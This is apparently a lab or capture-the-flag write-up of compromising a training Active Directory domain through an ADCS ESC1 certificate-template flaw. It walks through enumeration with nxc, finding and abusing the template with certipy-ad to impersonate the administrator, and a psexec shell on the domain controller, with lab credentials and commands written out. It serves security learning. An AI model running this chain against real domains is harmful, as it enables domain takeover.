This project documents a comprehensive penetration testing process on a Windows Active Directory environment, specifically targeting Active Directory Certificate Services (ADCS) to achieve Domain Admin privileges.
Phase 1: Reconnaissance & Initial Access
The attack began with user enumeration and credential validation using NetExec (nxc). I focused on identifying potential entry points and checking for unique modules like security questions.

nxc smb 10.48.162.248 -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!' -M security-questions

To visualize the attack path, I deployed BloodHound Community Edition. Encountered several Docker dependency issues, which were resolved by installing docker-compose.
# BloodHound CLI & Environment Setup


sudo apt update && sudo apt install -y docker-compose
sudo ./bloodhound-cli install

Phase 2: Identifying ADCS Vulnerabilities (ESC1)
Analyzing the BloodHound graph revealed a critical misconfiguration in the Certificate Templates. I utilized Certipy to confirm the ESC1 vulnerability.

certipy-ad find -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' -target 10.48.162.248 -vulnerable -stdout

Findings: The ServerAuth template allows Enrollee Supplies Subject, enabling any authenticated user to impersonate any domain account (Impersonation).

Phase 3: Exploitation & Impersonation
Leveraging the ESC1 vulnerability, I requested a certificate for the Administrator and Bradley Ortiz accounts.
Despite DNS resolution failures, the attack was successful by specifying the Domain Controller IP directly.

certipy-ad req -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' -ca 'thm-LABYRINTH-CA' -template 'ServerAuth' -upn 'administrator@thm.local' -target <<(your.thm.ip)>> -dc-ip <<(your.thm.ip)>>

Artifacts Obtained: administrator.pfx and bradley_ortiz.pfx.

Phase 4: Final Privilege Escalation (Bingo!)After obtaining the PFX certificates and extracting the necessary credentials,
I used Impacket-PsExec to gain a remote interactive shell on the Domain Controller.

impacket-psexec 'THM.LOCAL/BRADLEY_ORTIZ:Berkgedenpassword123!@10.48.162.248'

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
THM{THE_BYPASS_*********}
